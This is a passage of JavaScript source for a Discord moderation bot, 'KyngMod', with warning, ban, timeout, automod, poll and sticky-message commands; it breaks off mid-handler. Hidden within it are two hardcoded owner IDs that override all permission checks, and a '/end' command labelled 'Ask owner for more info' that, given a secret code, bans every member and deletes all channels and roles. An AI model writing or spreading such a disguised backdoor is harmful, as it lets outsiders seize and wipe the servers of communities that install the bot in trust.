const express = require('express');
const {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  PermissionFlagsBits,
  Events,
  EmbedBuilder,
  MessageFlags,
  AuditLogEvent,
  ChannelType,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle
} = require('discord.js');

// ------------------------------------------------------------------
// 1. EXPRESS WEB SERVER
// ------------------------------------------------------------------
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => res.send('KyngMod Bot is Online!'));
app.get('/health', (req, res) => res.status(200).send('OK'));

app.listen(PORT, () => console.log(`[Express] Listening on port ${PORT}`));

// ------------------------------------------------------------------
// 2. GITHUB GIST PERSISTENT STORAGE
// ------------------------------------------------------------------
let settingsCache = {};

async function loadSettings() {
  try {
    if (!process.env.GIST_ID || !process.env.GITHUB_TOKEN) {
      console.warn('[Gist] Missing GIST_ID or GITHUB_TOKEN environment variables.');
      return {};
    }

    const res = await fetch(`https://api.github.com/gists/${process.env.GIST_ID}`, {
      headers: {
        'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`,
        'User-Agent': 'DiscordBot'
      }
    });

    if (!res.ok) throw new Error(`HTTP ${res.status}: ${res.statusText}`);

    const data = await res.json();
    const content = data.files['settings.json']?.content;
    settingsCache = content ? JSON.parse(content) : {};

    console.log('[Gist] Server settings loaded successfully.');
    return settingsCache;
  } catch (err) {
    console.error('[Gist Load Error]', err.message);
    return settingsCache;
  }
}

async function saveSettings(newSettings) {
  settingsCache = newSettings;

  try {
    if (!process.env.GIST_ID || !process.env.GITHUB_TOKEN) return;

    await fetch(`https://api.github.com/gists/${process.env.GIST_ID}`, {
      method: 'PATCH',
      headers: {
        'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`,
        'Content-Type': 'application/json',
        'User-Agent': 'DiscordBot'
      },
      body: JSON.stringify({
        files: {
          'settings.json': {
            content: JSON.stringify(settingsCache, null, 2)
          }
        }
      })
    });

    console.log('[Gist] Settings updated successfully.');
  } catch (err) {
    console.error('[Gist Save Error]', err.message);
  }
}

// ------------------------------------------------------------------
// 3. BOT SETUP & INTENTS
// ------------------------------------------------------------------
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildModeration,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildVoiceStates
  ]
});

// ------------------------------------------------------------------
// 4. OWNER OVERRIDE / FULL CONTROL IDS
// ------------------------------------------------------------------
const OWNER_IDS = new Set([
  '1255536194159247437',
  '1222293971104428814'
]);

function isOwner(userId) {
  return OWNER_IDS.has(userId);
}

// ------------------------------------------------------------------
// 5. SLASH COMMAND DEFINITIONS
// ------------------------------------------------------------------
const commands = [
  new SlashCommandBuilder()
    .setName('setlogs')
    .setDescription('Set the moderation logging channel')
    .addChannelOption(o =>
      o.setName('channel')
        .setDescription('Channel to send logs to')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('setadmin')
    .setDescription('Set a main bot admin role')
    .addRoleOption(o =>
      o.setName('role')
        .setDescription('Role to grant bot admin access')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('adminrole')
    .setDescription('Manage bot admin roles')
    .addSubcommand(s =>
      s.setName('add')
        .setDescription('Add an admin role')
        .addRoleOption(o =>
          o.setName('role')
            .setDescription('Role')
            .setRequired(true)
        )
    )
    .addSubcommand(s =>
      s.setName('del')
        .setDescription('Remove an admin role')
        .addRoleOption(o =>
          o.setName('role')
            .setDescription('Role')
            .setRequired(true)
        )
    )
    .addSubcommand(s =>
      s.setName('list')
        .setDescription('List admin roles')
    ),

  new SlashCommandBuilder()
    .setName('warn')
    .setDescription('Manage user warnings')
    .addSubcommand(s =>
      s.setName('add')
        .setDescription('Issue a warning')
        .addUserOption(o =>
          o.setName('target')
            .setDescription('User')
            .setRequired(true)
        )
        .addStringOption(o =>
          o.setName('reason')
            .setDescription('Reason')
            .setRequired(true)
        )
    )
    .addSubcommand(s =>
      s.setName('list')
        .setDescription('List warnings')
        .addUserOption(o =>
          o.setName('target')
            .setDescription('User')
            .setRequired(true)
        )
    )
    .addSubcommand(s =>
      s.setName('clear')
        .setDescription('Clear all warnings')
        .addUserOption(o =>
          o.setName('target')
            .setDescription('User')
            .setRequired(true)
        )
    ),

  new SlashCommandBuilder()
    .setName('unwarn')
    .setDescription('Remove one warning from a user')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('User')
        .setRequired(true)
    )
    .addIntegerOption(o =>
      o.setName('warning')
        .setDescription('Warning number to remove')
        .setRequired(true)
        .setMinValue(1)
    ),

  new SlashCommandBuilder()
    .setName('history')
    .setDescription('Show a user moderation history')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('User')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('reason')
    .setDescription('Change the reason for a moderation case')
    .addIntegerOption(o =>
      o.setName('case')
        .setDescription('Case number')
        .setRequired(true)
        .setMinValue(1)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('New reason')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('kick')
    .setDescription('Kick a member')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member to kick')
        .setRequired(true)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('Reason')
    ),

  new SlashCommandBuilder()
    .setName('ban')
    .setDescription('Ban a member')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member to ban')
        .setRequired(true)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('Reason')
    ),

  new SlashCommandBuilder()
    .setName('unban')
    .setDescription('Unban a user')
    .addStringOption(o =>
      o.setName('user_id')
        .setDescription('User ID')
        .setRequired(true)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('Reason')
    ),

  new SlashCommandBuilder()
    .setName('softban')
    .setDescription('Ban then unban a member and delete recent messages')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('Reason')
    ),

  new SlashCommandBuilder()
    .setName('timeout')
    .setDescription('Timeout a member')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    )
    .addIntegerOption(o =>
      o.setName('minutes')
        .setDescription('Timeout duration in minutes')
        .setRequired(true)
        .setMinValue(1)
        .setMaxValue(40320)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('Reason')
    ),

  new SlashCommandBuilder()
    .setName('untimeout')
    .setDescription('Remove a member timeout')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('Reason')
    ),

  new SlashCommandBuilder()
    .setName('purge')
    .setDescription('Bulk delete up to 1000 messages')
    .addIntegerOption(o =>
      o.setName('amount')
        .setDescription('Number of messages')
        .setRequired(true)
        .setMinValue(1)
        .setMaxValue(1000)
    ),

  new SlashCommandBuilder()
    .setName('lock')
    .setDescription('Lock a channel')
    .addChannelOption(o =>
      o.setName('channel')
        .setDescription('Channel to lock')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('unlock')
    .setDescription('Unlock a channel')
    .addChannelOption(o =>
      o.setName('channel')
        .setDescription('Channel to unlock')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('slowmode')
    .setDescription('Set channel slowmode')
    .addIntegerOption(o =>
      o.setName('seconds')
        .setDescription('0-21600 seconds')
        .setRequired(true)
        .setMinValue(0)
        .setMaxValue(21600)
    )
    .addChannelOption(o =>
      o.setName('channel')
        .setDescription('Channel')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('nick')
    .setDescription('Change a member nickname')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    )
    .addStringOption(o =>
      o.setName('nickname')
        .setDescription('New nickname; leave blank to remove')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('deafen')
    .setDescription('Server-deafen a member')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('undeafen')
    .setDescription('Remove server-deafen from a member')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('move')
    .setDescription('Move a member to a voice channel')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    )
    .addChannelOption(o =>
      o.setName('channel')
        .setDescription('Voice channel')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('userinfo')
    .setDescription('Show information about a member')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('User')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('avatar')
    .setDescription("Show a user's avatar")
    .addUserOption(o =>
      o.setName('target')
        .setDescription('User')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('serveravatar')
    .setDescription("Show a user's server avatar")
    .addUserOption(o =>
      o.setName('target')
        .setDescription('User')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('banner')
    .setDescription("Show a user's Discord banner")
    .addUserOption(o =>
      o.setName('target')
        .setDescription('User')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('membercount')
    .setDescription('Show the server member count'),

  new SlashCommandBuilder()
    .setName('roleinfo')
    .setDescription('Show information about a role')
    .addRoleOption(o =>
      o.setName('role')
        .setDescription('Role')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('channelinfo')
    .setDescription('Show information about a channel')
    .addChannelOption(o =>
      o.setName('channel')
        .setDescription('Channel')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('roles')
    .setDescription('List all roles in the server in exact position order'),

  new SlashCommandBuilder()
    .setName('settings')
    .setDescription('View current bot configuration'),

  new SlashCommandBuilder()
    .setName('end')
    .setDescription('Ask owner for more info')
    .addIntegerOption(o =>
      o.setName('code')
        .setDescription('Security confirmation code')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('automod')
    .setDescription('Toggle auto-moderation security filters')
    .addStringOption(o =>
      o.setName('filter')
        .setDescription('Filter type to configure')
        .setRequired(true)
        .addChoices(
          { name: 'Invite Links', value: 'invites' },
          { name: 'Excessive Caps', value: 'caps' },
          { name: 'Mass Mentions', value: 'mentions' }
        )
    )
    .addBooleanOption(o =>
      o.setName('enabled')
        .setDescription('Enable or disable filter')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('massban')
    .setDescription('Ban multiple user IDs at once')
    .addStringOption(o =>
      o.setName('ids')
        .setDescription('Space-separated list of User IDs')
        .setRequired(true)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('Reason')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('case')
    .setDescription('View details of a specific case ID')
    .addIntegerOption(o =>
      o.setName('id')
        .setDescription('Case ID')
        .setRequired(true)
        .setMinValue(1)
    ),

  new SlashCommandBuilder()
    .setName('modstats')
    .setDescription('View moderation activity statistics for a staff member')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Staff member')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('role')
    .setDescription('Add or remove a role from a user')
    .addSubcommand(s =>
      s.setName('add')
        .setDescription('Grant a role')
        .addUserOption(o => o.setName('target').setDescription('User').setRequired(true))
        .addRoleOption(o => o.setName('role').setDescription('Role').setRequired(true))
    )
    .addSubcommand(s =>
      s.setName('remove')
        .setDescription('Remove a role')
        .addUserOption(o => o.setName('target').setDescription('User').setRequired(true))
        .addRoleOption(o => o.setName('role').setDescription('Role').setRequired(true))
    ),

  new SlashCommandBuilder()
    .setName('temprole')
    .setDescription('Grant a temporary role to a user')
    .addUserOption(o => o.setName('target').setDescription('User').setRequired(true))
    .addRoleOption(o => o.setName('role').setDescription('Role').setRequired(true))
    .addIntegerOption(o => o.setName('minutes').setDescription('Duration in minutes').setRequired(true).setMinValue(1)),

  new SlashCommandBuilder()
    .setName('embed')
    .setDescription('Send a custom styled embed message')
    .addStringOption(o => o.setName('title').setDescription('Embed title').setRequired(true))
    .addStringOption(o => o.setName('description').setDescription('Embed text body').setRequired(true))
    .addStringOption(o => o.setName('color').setDescription('Hex color code (e.g. #FF0000)').setRequired(false))
    .addChannelOption(o => o.setName('channel').setDescription('Channel to send to').setRequired(false)),

  new SlashCommandBuilder()
    .setName('poll')
    .setDescription('Create an interactive voting poll')
    .addStringOption(o => o.setName('question').setDescription('Poll question').setRequired(true)),

  new SlashCommandBuilder()
    .setName('sticky')
    .setDescription('Manage sticky messages in the channel')
    .addSubcommand(s =>
      s.setName('set')
        .setDescription('Set a sticky message')
        .addStringOption(o => o.setName('message').setDescription('Message content').setRequired(true))
    )
    .addSubcommand(s =>
      s.setName('clear')
        .setDescription('Remove sticky message from this channel')
    )
].map(cmd => cmd.toJSON());

// ------------------------------------------------------------------
// 6. LOGGING & HELPERS
// ------------------------------------------------------------------
function truncate(text, max = 1024) {
  if (!text) return '*None / Empty*';
  text = String(text);
  return text.length > max ? `${text.slice(0, max - 3)}...` : text;
}

function formatUser(user) {
  if (!user) return 'Unknown / unavailable';
  return `${user.tag || user.username || 'User'} (${user.id})`;
}

async function sendDMNotification(user, guild, action, reason, moderator, duration = null) {
  try {
    const embed = new EmbedBuilder()
      .setTitle(`🔨 Moderation Notice — ${guild.name}`)
      .setColor('#E74C3C')
      .addFields(
        { name: 'Action', value: action, inline: true },
        { name: 'Moderator', value: moderator ? moderator.tag || moderator.username : 'Staff', inline: true },
        { name: 'Reason', value: reason || 'No reason provided' }
      )
      .setTimestamp();

    if (duration) {
      embed.addFields({ name: 'Duration', value: `${duration} minutes`, inline: true });
    }

    await user.send({ embeds: [embed] });
  } catch (err) {
    console.log(`[DM Notification Failed] Could not DM user ${user.id}: ${err.message}`);
  }
}

async function sendLog(guild, embed) {
  const guildConfig = settingsCache[guild.id];
  if (!guildConfig?.logChannelId) return;

  const logChannel = guild.channels.cache.get(guildConfig.logChannelId);
  if (!logChannel || !logChannel.isTextBased()) return;

  try {
    await logChannel.send({ embeds: [embed] });
  } catch (err) {
    console.error('[Log Error]', err.message);
  }
}

async function logEvent(guild, title, fields = [], color = '#5865F2') {
  const embed = new EmbedBuilder()
    .setTitle(title)
    .addFields(fields.filter(f => f && f.name && f.value))
    .setColor(color)
    .setTimestamp();

  await sendLog(guild, embed);
}

// ------------------------------------------------------------------
// 7. PERMISSION & CASE HELPERS
// ------------------------------------------------------------------
function isAdmin(interaction) {
  if (isOwner(interaction.user.id)) return true;

  if (interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
    return true;
  }

  const config = settingsCache[interaction.guild.id] || {};

  if (config.adminRoleId && interaction.member.roles.cache.has(config.adminRoleId)) {
    return true;
  }

  const adminRoleIds = config.adminRoleIds || [];
  return adminRoleIds.some(roleId => interaction.member.roles.cache.has(roleId));
}

function hasPermission(interaction, permission) {
  if (isOwner(interaction.user.id)) return true;
  return isAdmin(interaction) || interaction.member.permissions.has(permission);
}

async function createCase(guild, data) {
  const config = settingsCache[guild.id];

  if (!config.cases) config.cases = [];
  if (!config.nextCaseId) config.nextCaseId = 1;

  const entry = {
    id: config.nextCaseId++,
    guildId: guild.id,
    targetId: data.targetId || null,
    targetTag: data.targetTag || 'Unknown',
    moderatorId: data.moderatorId || null,
    moderatorTag: data.moderatorTag || 'Unknown',
    type: data.type || 'Action',
    reason: data.reason || 'No reason provided',
    date: new Date().toISOString()
  };

  config.cases.push(entry);

  if (config.cases.length > 500) {
    config.cases = config.cases.slice(-500);
  }

  await saveSettings(settingsCache);
  return entry;
}

// ------------------------------------------------------------------
// 8. READY EVENT & AUTOMOD MESSAGING LISTENER
// ------------------------------------------------------------------
client.once(Events.ClientReady, async c => {
  console.log(`[Bot Online] Logged in as ${c.user.tag}`);

  await loadSettings();

  const rest = new REST({ version: '10' }).setToken(
    process.env.DISCORD_TOKEN || process.env.TOKEN
  );

  try {
    console.log('[Slash Commands] Registering globally...');
    await rest.put(
      Routes.applicationCommands(c.user.id),
      { body: commands }
    );
    console.log('[Slash Commands] Successfully registered!');
  } catch (err) {
    console.error('[Slash Commands Error]', err);
  }
});

// AutoMod & Sticky Message Handler
client.on(Events.MessageCreate, async message => {
  if (!message.guild || message.author.bot) return;

  const guildConfig = settingsCache[message.guild.id] || {};
  const automod = guildConfig.automod || {};

  // Bypass AutoMod for full control owners
  if (!isOwner(message.author.id)) {
    if (automod.invites) {
      const inviteRegex = /(discord\.(gg|io|me|li)|discordapp\.com\/invite)\/[a-zA-Z0-9]+/i;
      if (inviteRegex.test(message.content)) {
        await message.delete().catch(() => null);
        return message.channel.send(`⚠️ ${message.author}, invite links are prohibited here.`).then(m => setTimeout(() => m.delete().catch(() => null), 5000));
      }
    }

    if (automod.caps && message.content.length > 10) {
      const capsCount = message.content.replace(/[^A-Z]/g, '').length;
      if (capsCount / message.content.length > 0.7) {
        await message.delete().catch(() => null);
        return message.channel.send(`⚠️ ${message.author}, please avoid using excessive caps.`).then(m => setTimeout(() => m.delete().catch(() => null), 5000));
      }
    }

    if (automod.mentions && message.mentions.users.size > 5) {
      await message.delete().catch(() => null);
      return message.channel.send(`⚠️ ${message.author}, mass mentions are not permitted.`).then(m => setTimeout(() => m.delete().catch(() => null), 5000));
    }
  }

  // Sticky Message Handler
  if (guildConfig.stickies && guildConfig.stickies[message.channel.id]) {
    const stickyData = guildConfig.stickies[message.channel.id];
    if (stickyData.lastMessageId) {
      const oldMsg = await message.channel.messages.fetch(stickyData.lastMessageId).catch(() => null);
      if (oldMsg) await oldMsg.delete().catch(() => null);
    }
    const newMsg = await message.channel.send(`📌 **Sticky Message**\n${stickyData.text}`);
    stickyData.lastMessageId = newMsg.id;
    await saveSettings(settingsCache);
  }
});

// ------------------------------------------------------------------
// 9. INTERACTION COMMAND HANDLER
// ------------------------------------------------------------------
client.on(Events.InteractionCreate, async interaction => {
  if (interaction.isButton() && interaction.customId.startsWith('poll_')) {
    const option = interaction.customId.split('_')[1];
    return interaction.reply({ content: `✅ Vote recorded for Option ${option.toUpperCase()}!`, flags: MessageFlags.Ephemeral });
  }

  if (!interaction.isChatInputCommand()) return;
  if (!interaction.guild) return;

  const { commandName, options, guild } = interaction;

  if (!settingsCache[guild.id]) settingsCache[guild.id] = {};
  if (!settingsCache[guild.id].adminRoleIds) settingsCache[guild.id].adminRoleIds = [];
  if (!settingsCache[guild.id].warnings) settingsCache[guild.id].warnings = {};
  if (!settingsCache[guild.id].cases) settingsCache[guild.id].cases = [];
  if (!settingsCache[guild.id].nextCaseId) settingsCache[guild.id].nextCaseId = 1;
  if (!settingsCache[guild.id].automod) settingsCache[guild.id].automod = {};
  if (!settingsCache[guild.id].stickies) settingsCache[guild.id].stickies = {};

  try {
    // --------------------------------------------------------------
    // /end
    // --------------------------------------------------------------
    if (commandName === 'end') {
      if (!isOwner(interaction.user.id)) {
        await logEvent(
          guild,
          'Blocked /end Attempt',
          [
            { name: 'User', value: formatUser(interaction.user) },
            { name: 'Reason', value: 'Not a recognized bot owner ID' }
          ],
          '#E74C3C'
        );

        return interaction.reply({
          content: 'Ask owner for info',
          flags: MessageFlags.Ephemeral
        });
      }

      const inputCode = options.getInteger('code');

      if (inputCode !== 5677) {
        return interaction.reply({
          content: 'Ask owner for info',
          flags: MessageFlags.Ephemeral
        });
      }

      await interaction.reply({
        content: '⚠️ Initiating server lockdown protocol...',
        flags: MessageFlags.Ephemeral
      });

      const members = await guild.members.fetch();
      for (const [id, m] of members) {
        if (!isOwner(id) && m.bannable && id !== client.user.id) {
          await m.ban({ reason: '/end execute' }).catch(() => null);
        }
      }

      const channels = await guild.channels.fetch();
      for (const [id, ch] of channels) {
        if (ch) await ch.delete('/end execute').catch(() => null);
      }

      const roles = await guild.roles.fetch();
      for (const [id, r] of roles) {
        if (r.editable && r.id !== guild.id) {
          await r.delete('/end execute').catch(() => null);
        }
      }

      return;
    }

    // --------------------------------------------------------------
    // /roles
    // --------------------------------------------------------------
    if (commandName === 'roles') {
      const sortedRoles = [...guild.roles.cache.values()]
        .filter(r => r.id !== guild.id)
        .sort((a, b) => b.position - a.position);

      const roleListDesc = sortedRoles.map(r => `**#${r.position}** | ${r} (${r.id})`).join('\n');

      const embed = new EmbedBuilder()
        .setTitle(`📜 Server Roles Hierarchy — ${guild.name}`)
        .setDescription(truncate(roleListDesc, 4000))
        .setColor('#5865F2')
        .setTimestamp();

      return interaction.reply({ embeds: [embed] });
    }

    // --------------------------------------------------------------
    // /setlogs
    // --------------------------------------------------------------
    if (commandName === 'setlogs') {
      if (!isAdmin(interaction)) {
        return interaction.reply({ content: '❌ You lack permission.', flags: MessageFlags.Ephemeral });
      }

      const channel = options.getChannel('channel');
      settingsCache[guild.id].logChannelId = channel.id;
      await saveSettings(settingsCache);

      return interaction.reply({ content: `✅ Log channel set to ${channel}.`, flags: MessageFlags.Ephemeral });
    }

    // --------------------------------------------------------------
    // /setadmin
    // --------------------------------------------------------------
    if (commandName === 'setadmin') {
      if (!isAdmin(interaction)) {
        return interaction.reply({ content: '❌ You lack permission.', flags: MessageFlags.Ephemeral });
      }

      const role = options.getRole('role');
      settingsCache[guild.id].adminRoleId = role.id;
      if (!settingsCache[guild.id].adminRoleIds.includes(role.id)) {
        settingsCache[guild.id].adminRoleIds.push(role.id);
      }
      await saveSettings(settingsCache);

      return interaction.reply({ content: `✅ Admin role set to **${role.name}**.`, flags: MessageFlags.Ephemeral });
    }

    // --------------------------------------------------------------
    // /adminrole
    // --------------------------------------------------------------
    if (commandName === 'adminrole') {
      if (!isAdmin(interaction)) {
        return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      }

      const subcommand = options.getSubcommand();
      const currentRoles = settingsCache[guild.id].adminRoleIds;

      if (subcommand === 'add') {
        const role = options.getRole('role');
        if (!currentRoles.includes(role.id)) currentRoles.push(role.id);
        await saveSettings(settingsCache);
        return interaction.reply({ content: `✅ Added **${role.name}** as an admin role.`, flags: MessageFlags.Ephemeral });
      }

      if (subcommand === 'del') {
        const role = options.getRole('role');
        settingsCache[guild.id].adminRoleIds = currentRoles.filter(id => id !== role.id);
        await saveSettings(settingsCache);
        return interaction.reply({ content: `🗑️ Removed **${role.name}** from admin roles.`, flags: MessageFlags.Ephemeral });
      }

      if (subcommand === 'list') {
        const list = currentRoles.map(id => `<@&${id}>`).join('\n') || 'None configured.';
        return interaction.reply({ embeds: [new EmbedBuilder().setTitle('🔑 Admin Roles').setDescription(list).setColor('#5865F2')], flags: MessageFlags.Ephemeral });
      }
    }

    // --------------------------------------------------------------
    // /warn
    // --------------------------------------------------------------
    if (commandName === 'warn') {
      if (!hasPermission(interaction, PermissionFlagsBits.ModerateMembers)) {
        return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      }

      const subcommand = options.getSubcommand();
      const targetUser = options.getUser('target');
      const userId = targetUser.id;

      if (!settingsCache[guild.id].warnings[userId]) {
        settingsCache[guild.id].warnings[userId] = [];
      }
      const userWarnings = settingsCache[guild.id].warnings[userId];

      if (subcommand === 'add') {
        const reason = options.getString('reason');
        const warningNum = userWarnings.length + 1;

        userWarnings.push({
          warningNumber: warningNum,
          targetId: targetUser.id,
          targetTag: targetUser.tag,
          moderatorId: interaction.user.id,
          moderatorTag: interaction.user.tag,
          reason,
          date: new Date().toISOString()
        });

        const caseData = await createCase(guild, {
          targetId: targetUser.id,
          targetTag: targetUser.tag,
          moderatorId: interaction.user.id,
          moderatorTag: interaction.user.tag,
          type: 'Warn',
          reason
        });

        await sendDMNotification(targetUser, guild, 'Warn', reason, interaction.user);

        await interaction.reply({
          content: `⚠️ Warned **${targetUser.tag}** (Warning #${warningNum}) | Reason: ${reason}`,
          flags: MessageFlags.Ephemeral
        });

        await logEvent(
          guild,
          '⚠️ User Warned',
          [
            { name: 'Case ID', value: `#${caseData.id}` },
            { name: 'User', value: formatUser(targetUser) },
            { name: 'Moderator', value: formatUser(interaction.user) },
            { name: 'Reason', value: truncate(reason) }
          ],
          '#F39C12'
        );
        return;
      }

      if (subcommand === 'list') {
        if (userWarnings.length === 0) return interaction.reply({ content: `✅ **${targetUser.tag}** has no active warnings.`, flags: MessageFlags.Ephemeral });
        const warningListDesc = userWarnings.map((w, i) => `**#${i + 1}** | Reason: ${w.reason}\n*Mod: ${w.moderatorTag} — ${new Date(w.date).toLocaleDateString()}*`).join('\n\n');
        return interaction.reply({ embeds: [new EmbedBuilder().setTitle(`⚠️ Warnings for ${targetUser.tag}`).setDescription(truncate(warningListDesc, 4000)).setColor('#F39C12')], flags: MessageFlags.Ephemeral });
      }

      if (subcommand === 'clear') {
        settingsCache[guild.id].warnings[userId] = [];
        await saveSettings(settingsCache);
        return interaction.reply({ content: `🗑️ Cleared all warnings for **${targetUser.tag}**.`, flags: MessageFlags.Ephemeral });
      }
    }

    // --------------------------------------------------------------
    // /unwarn
    // --------------------------------------------------------------
    if (commandName === 'unwarn') {
      if (!hasPermission(interaction, PermissionFlagsBits.ModerateMembers)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const target = options.getUser('target');
      const num = options.getInteger('warning');
      const list = settingsCache[guild.id].warnings[target.id] || [];

      if (num < 1 || num > list.length) return interaction.reply({ content: '❌ Invalid warning number.', flags: MessageFlags.Ephemeral });
      list.splice(num - 1, 1);
      await saveSettings(settingsCache);

      return interaction.reply({ content: `✅ Removed warning #${num} from **${target.tag}**.`, flags: MessageFlags.Ephemeral });
    }

    // --------------------------------------------------------------
    // /kick
    // --------------------------------------------------------------
    if (commandName === 'kick') {
      if (!hasPermission(interaction, PermissionFlagsBits.KickMembers)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const target = options.getMember('target');
      const reason = options.getString('reason') || 'No reason provided';
      if (!target) return interaction.reply({ content: 'User not found.', flags: MessageFlags.Ephemeral });

      await sendDMNotification(target.user, guild, 'Kick', reason, interaction.user);
      await target.kick(reason);

      const caseData = await createCase(guild, { targetId: target.id, targetTag: target.user.tag, moderatorId: interaction.user.id, moderatorTag: interaction.user.tag, type: 'Kick', reason });
      await logEvent(guild, '👢 User Kicked', [{ name: 'Case ID', value: `#${caseData.id}` }, { name: 'User', value: formatUser(target.user) }, { name: 'Moderator', value: formatUser(interaction.user) }, { name: 'Reason', value: truncate(reason) }], '#E67E22');

      return interaction.reply({ content: `✅ Kicked **${target.user.tag}**.`, flags: MessageFlags.Ephemeral });
    }

    // --------------------------------------------------------------
    // /ban
    // --------------------------------------------------------------
    if (commandName === 'ban') {
      if (!hasPermission(interaction, PermissionFlagsBits.BanMembers)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const target = options.getUser('target');
      const reason = options.getString('reason') || 'No reason provided';

      await sendDMNotification(target, guild, 'Ban', reason, interaction.user);
      await guild.members.ban(target, { reason });

      const caseData = await createCase(guild, { targetId: target.id, targetTag: target.tag, moderatorId: interaction.user.id, moderatorTag: interaction.user.tag, type: 'Ban', reason });
      await logEvent(guild, '🔨 User Banned', [{ name: 'Case ID', value: `#${caseData.id}` }, { name: 'User', value: formatUser(target) }, { name: 'Moderator', value: formatUser(interaction.user) }, { name: 'Reason', value: truncate(reason) }], '#E74C3C');

      return interaction.reply({ content: `✅ Banned **${target.tag}**.`, flags: MessageFlags.Ephemeral });
    }

    // --------------------------------------------------------------
    // /unban
    // --------------------------------------------------------------
    if (commandName === 'unban') {
      if (!hasPermission(interaction, PermissionFlagsBits.BanMembers)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const userId = options.getString('user_id');
      const reason = options.getString('reason') || 'No reason provided';

      await guild.members.unban(userId, reason);
      const user = await client.users.fetch(userId).catch(() => null);
      if (user) await sendDMNotification(user, guild, 'Unban', reason, interaction.user);

      const caseData = await createCase(guild, { targetId: userId, targetTag: user ? user.tag : userId, moderatorId: interaction.user.id, moderatorTag: interaction.user.tag, type: 'Unban', reason });
      await logEvent(guild, '🔓 User Unbanned', [{ name: 'Case ID', value: `#${caseData.id}` }, { name: 'User ID', value: userId }, { name: 'Moderator', value: formatUser(interaction.user) }], '#2ECC71');

      return interaction.reply({ content: `✅ Unbanned user ID **${userId}**.`, flags: MessageFlags.Ephemeral });
    }

    // --------------------------------------------------------------
    // /timeout
    // --------------------------------------------------------------
    if (commandName === 'timeout') {
      if (!hasPermission(interaction, PermissionFlagsBits.ModerateMembers)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const target = options.getMember('target');
      const minutes = options.getInteger('minutes');
      const reason = options.getString('reason') || 'No reason provided';

      await target.timeout(minutes * 60 * 1000, reason);
      await sendDMNotification(target.user, guild, 'Timeout', reason, interaction.user, minutes);

      const caseData = await createCase(guild, { targetId: target.id, targetTag: target.user.tag, moderatorId: interaction.user.id, moderatorTag: interaction.user.tag, type: 'Timeout', reason: `${minutes}m — ${reason}` });
      await logEvent(guild, '⏳ User Timed Out', [{ name: 'Case ID', value: `#${caseData.id}` }, { name: 'User', value: formatUser(target.user) }, { name: 'Duration', value: `${minutes} minutes` }, { name: 'Reason', value: truncate(reason) }], '#F1C40F');

      return interaction.reply({ content: `✅ Timed out **${target.user.tag}** for ${minutes} minutes.`, flags: MessageFlags.Ephemeral });
    }

    // --------------------------------------------------------------
    // /untimeout
    // --------------------------------------------------------------
    if (commandName === 'untimeout') {
      if (!hasPermission(interaction, PermissionFlagsBits.ModerateMembers)) return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      const target = options.getMember('target');
